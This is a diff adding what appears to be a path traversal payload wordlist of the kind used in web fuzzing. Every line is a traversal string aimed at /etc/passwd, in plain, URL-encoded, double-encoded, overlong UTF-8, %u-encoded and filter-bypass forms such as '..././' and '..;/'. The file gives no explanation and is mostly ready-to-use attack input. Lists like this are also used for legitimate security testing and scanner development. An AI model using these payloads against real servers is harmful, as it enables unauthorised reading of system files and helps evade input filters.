@@ -1,0 +1,31 @@
+../../../../../../../../etc/passwd
+..\..\..\..\..\..\..\..\etc/passwd
+..\/..\/..\/..\/..\/..\/..\/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd
+%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/passwd
+%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216etc/passwd
+%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215etc/passwd
+%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216etc/passwd
+%u002e%u002e%u2216%u2215%u002e%u002e%u2216%u2215%u002e%u002e%u2216%u2215%u002e%u002e%u2216%u2215%u002e%u002e%u2216%u2215%u002e%u002e%u2216%u2215%u002e%u002e%u2216%u2215etc/passwd
+%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc/passwd
+%c0%2e%c0%2e%e0%80%af%c0%2e%c0%2e%e0%80%af%c0%2e%c0%2e%e0%80%af%c0%2e%c0%2e%e0%80%af%c0%2e%c0%2e%e0%80%afetc/passwd
+%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/passwd
+%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cetc/passwd
+%c0%2e%c0%2e%c0%80%5c%c0%2e%c0%2e%c0%80%5c%c0%2e%c0%2e%c0%80%5c%c0%2e%c0%2e%c0%80%5c%c0%2e%c0%2e%c0%80%5cetc/passwd
+%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc/passwd
+%c0%2e%c0%2e%e0%80%af%c0%2e%c0%2e%e0%80%af%c0%2e%c0%2e%e0%80%af%c0%2e%c0%2e%e0%80%af%c0%2e%c0%2e%e0%80%afetc/passwd
+%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/passwd
+%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cetc/passwd
+%c0%2e%c0%2e%c0%80%5c%c0%2e%c0%2e%c0%80%5c%c0%2e%c0%2e%c0%80%5c%c0%2e%c0%2e%c0%80%5c%c0%2e%c0%2e%c0%80%5cetc/passwd
+%c0ae%c0ae%c0%af%c0ae%c0ae%c0%af%c0ae%c0ae%c0%af%c0ae%c0ae%c0%af%c0ae%c0ae%c0%afetc/passwd
+%c0ae%c0ae%e0%80%af%c0ae%c0ae%e0%80%af%c0ae%c0ae%e0%80%af%c0ae%c0ae%e0%80%af%c0ae%c0ae%e0%80%afetc/passwd
+%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2fetc/passwd
+%c0ae%c0ae%c0%5c%c0ae%c0ae%c0%5c%c0ae%c0ae%c0%5c%c0ae%c0ae%c0%5c%c0ae%c0ae%c0%5cetc/passwd
+%c0ae%c0ae%c0%80%5c%c0ae%c0ae%c0%80%5c%c0ae%c0ae%c0%80%5c%c0ae%c0ae%c0%80%5c%c0ae%c0ae%c0%80%5cetc/passwd
+..././..././..././..././..././..././..././..././..././etc/passwd
+...\.\...\.\...\.\...\.\...\.\...\.\...\.\...\.\...\.\etc/passwd
+..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/passwd
+ %252e %252e %252f %252e %252e %252f %252e %252e %252f %252e %252e %252f %252e %252e %252f %252e %252e %252fetc/passwd
+ %252e %252e%252c %252e %252e%252c %252e %252e%252c %252e %252e%252c %252e %252e%252c %252e %252e%252c %252e %252e%252c %252e %252e%252c %252e %252e%252cetc/passwd
